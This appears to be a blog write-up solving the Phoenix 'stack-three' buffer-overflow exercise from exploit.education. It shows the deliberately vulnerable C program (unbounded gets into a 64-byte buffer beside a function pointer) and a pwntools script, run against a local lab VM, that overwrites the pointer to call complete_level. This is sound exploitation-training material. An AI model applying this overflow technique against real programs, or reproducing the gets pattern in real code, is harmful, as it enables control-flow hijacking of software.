## Stack-Three


![](https://cyberguru1.github.io/posts/phoenix/files/st3_header.png)

### Source Code
---

```
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}

```

Let's Dig in the code

- In the `main` function, a structure named `locals` is declared. It contains an array of characters called `buffer` with a size of `64` and a pointer to a function called `fp`.

- The banner message is printed using the `BANNER` macro.

- Next, the `fp` function pointer is set to `NULL`. Then, the `gets` function is called with the `buffer` as an argument, allowing user input to be stored in the `buffer`. This is a potential vulnerability since gets does not perform bounds checking and can lead to a buffer overflow.

- Afterward, an if statement checks `if` the `fp` function pointer is `non-null`. If it is, the address of the function pointer is printed, and the function pointer is called.

If the `fp` function pointer is still `NULL`, a message is printed indicating that the function pointer remains unmodified.

- Finally, the program exits with a status of 0.

The goal of the challenge is to change the value of the fp pointer to the address of the complete_level function, using GDB we could extract the address of the function

![](https://cyberguru1.github.io/posts/phoenix/files/st3_f-address.png)

the function address is `0x40069d`

this challenge is similar to the previous stack challenge, hence we use a similar script but with a slice change of parameters

### Solution Script
---

```
#!/usr/bin/python
## script by Hamza Saidu
## enjoy!!!

from pwn import *


s = ssh(host='localhost', user='user', password='user', port=2222)

p = s.process('/opt/phoenix/amd64/stack-three')

print(p.recvline())
p.sendline("A"*64 +"\x9d\x06\x40")
print(p.recvline())
print(p.recv(1024))

```
running the script we got:

![](https://cyberguru1.github.io/posts/phoenix/files/st3_result.png)

And viola!! Our complete_level function is called.